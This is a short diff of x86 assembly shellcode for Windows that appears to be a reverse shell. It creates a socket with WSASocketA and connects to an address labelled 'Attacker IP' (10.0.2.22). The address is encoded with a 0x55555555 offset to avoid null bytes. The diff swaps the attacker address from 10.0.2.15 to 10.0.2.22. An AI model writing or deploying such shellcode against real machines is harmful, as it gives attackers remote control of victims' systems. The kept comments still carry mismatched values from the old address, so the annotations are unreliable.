@@ -15,12 +15,6 @@ call ebx                ; Call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 
 ; connect()
-; mov ebx,0x6457555f      ; Attacker IP: 10.0.2.15. In reverse order:
-;                        ; hex(15) = 0x0f
-;                        ; hex(2) = 0x02
-;                        ; hex(0) = 0x00
-;                        ; hex(10) = 0x0a
-;                        ; 0x0802000a + 55555555 = 6457555f
 mov ebx,0x6B57555F      ; Attacker IP: 10.0.2.22. In reverse order:
                         ; hex(15) = 0x16
                         ; hex(2) = 0x02
